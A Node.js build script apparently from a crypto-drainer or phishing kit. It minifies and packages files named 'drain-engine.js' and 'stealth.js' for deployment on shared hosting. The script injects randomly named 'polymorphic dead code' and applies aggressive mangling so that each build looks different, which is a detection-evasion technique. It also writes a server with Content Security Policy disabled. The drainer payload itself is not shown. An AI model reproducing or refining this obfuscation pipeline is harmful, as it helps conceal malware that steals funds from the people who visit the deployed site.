// [PRODUCTION - BUILD SYSTEM]
// High-performance build automation for production assets.
// Authorized use only.

const fs = require('fs');
const path = require('path');
const { minify } = require('terser');
const CleanCSS = require('clean-css');
const { minify: minifyHtml } = require('html-minifier-terser');

async function buildFrontend() {
    console.log('[PRODUCTION] Building frontend for production deployment...');
    
    try {
        // Create dist directory
        const distDir = path.join(__dirname, 'dist');
        if (!fs.existsSync(distDir)) {
            fs.mkdirSync(distDir);
        }
        
        // Minify CSS
        console.log('[PRODUCTION] Minifying CSS...');
        const cssPath = path.join(__dirname, 'public', 'style.css');
        const cssContent = fs.readFileSync(cssPath, 'utf8');
        const minifiedCss = new CleanCSS({
            level: 2,
            format: 'keep-breaks'
        }).minify(cssContent).styles;
        
        // Minify and Obfuscate all JavaScript files
        console.log('[PRODUCTION] Minifying and obfuscating all JavaScript files...');
        const jsFiles = [
            { src: 'app.js', dest: 'app.js' },
            { src: 'drain-engine.js', dest: 'drain-engine.js' },
            { src: 'assets/js/stealth.js', dest: 'assets/js/stealth.js' }
        ];

        for (const file of jsFiles) {
            const srcPath = path.join(__dirname, 'public', file.src);
            if (!fs.existsSync(srcPath)) continue;
            
            const destPath = path.join(distDir, file.dest);
            const destDir = path.dirname(destPath);
            if (!fs.existsSync(destDir)) {
                fs.mkdirSync(destDir, { recursive: true });
            }

            let jsContent = fs.readFileSync(srcPath, 'utf8');
            
            // Inject Polymorphic Dead Code
            const deadCode = [
                `const _0x${Math.random().toString(16).slice(2, 8)} = () => { if(Math.random() > 0.99) console.log("System verified"); };`,
                `var _0x${Math.random().toString(16).slice(2, 8)} = "0x${Math.random().toString(16).slice(2, 10)}";`,
                `function _0x${Math.random().toString(16).slice(2, 8)}() { return true; }`
            ].join('\n');
            
            jsContent = deadCode + '\n' + jsContent;

            const minifiedJs = await minify(jsContent, {
                compress: {
                    drop_console: true,
                    drop_debugger: true,
                    pure_funcs: ['console.log', 'console.info', 'console.debug'],
                    passes: 3,
                    dead_code: true
                },
                mangle: {
                    toplevel: true,
                    properties: {
                        regex: /^_/
                    }
                },
                format: {
                    comments: false,
                    ascii_only: true
                }
            });
            
            fs.writeFileSync(destPath, minifiedJs.code);
            console.log(`[PRODUCTION] Obfuscated ${file.src}`);
        }
        
        // Minify HTML
        console.log('[PRODUCTION] Minifying HTML...');
        const htmlPath = path.join(__dirname, 'public', 'index.html');
        const htmlContent = fs.readFileSync(htmlPath, 'utf8');
        
        const minifiedHtml = await minifyHtml(htmlContent, {
            collapseWhitespace: true,
            removeComments: true,
            minifyCSS: true,
            minifyJS: true,
            removeAttributeQuotes: true,
            removeEmptyAttributes: true,
            removeOptionalTags: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true,
            useShortDoctype: true
        });
        
        // Write minified files
        fs.writeFileSync(path.join(distDir, 'style.css'), minifiedCss);
        fs.writeFileSync(path.join(distDir, 'index.html'), minifiedHtml);
        
        console.log('[PRODUCTION] Frontend build complete!');
        console.log('[PRODUCTION] Files written to dist/ directory');
        
        // Create production server file
        const productionServer = `
// [PRODUCTION - ASSET MANAGEMENT SYSTEM]
const express = require('express');
const path = require('path');
const helmet = require('helmet');
const compression = require('compression');

const app = express();
// Hostinger Shared Hosting/Node.js app uses process.env.PORT
const PORT = process.env.PORT || 3000;

app.use(helmet({
    contentSecurityPolicy: false, // Fully disabled for Hostinger compatibility
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: false
}));

app.use(compression());

// Serve static files from the current directory (dist)
app.use(express.static(__dirname));

// Serve the frontend
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(\`[PRODUCTION] Server running on port \${PORT}\`);
});
        `;
        
        fs.writeFileSync(path.join(distDir, 'server.js'), productionServer);
        
        // Copy mobile and admin folders to dist for a complete package
        const foldersToCopy = ['mobile', 'admin'];
        for (const folder of foldersToCopy) {
            const srcFolder = path.join(__dirname, folder);
            const destFolder = path.join(distDir, folder);
            if (fs.existsSync(srcFolder)) {
                if (!fs.existsSync(destFolder)) fs.mkdirSync(destFolder, { recursive: true });
                copyRecursiveSync(srcFolder, destFolder);
            }
        }

        console.log('[PRODUCTION] Standalone package created in dist/');
        
    } catch (error) {
        console.error(`[PRODUCTION] Build failed: ${error}`);
    }
}

// Helper function to copy folders recursively
function copyRecursiveSync(src, dest) {
    const exists = fs.existsSync(src);
    const stats = exists && fs.statSync(src);
    const isDirectory = exists && stats.isDirectory();
    if (isDirectory) {
        if (!fs.existsSync(dest)) fs.mkdirSync(dest);
        fs.readdirSync(src).forEach((childItemName) => {
            copyRecursiveSync(path.join(src, childItemName), path.join(dest, childItemName));
        });
    } else {
        fs.copyFileSync(src, dest);
    }
}

// Run build if called directly
if (require.main === module) {
    buildFrontend();
}

module.exports = { buildFrontend };
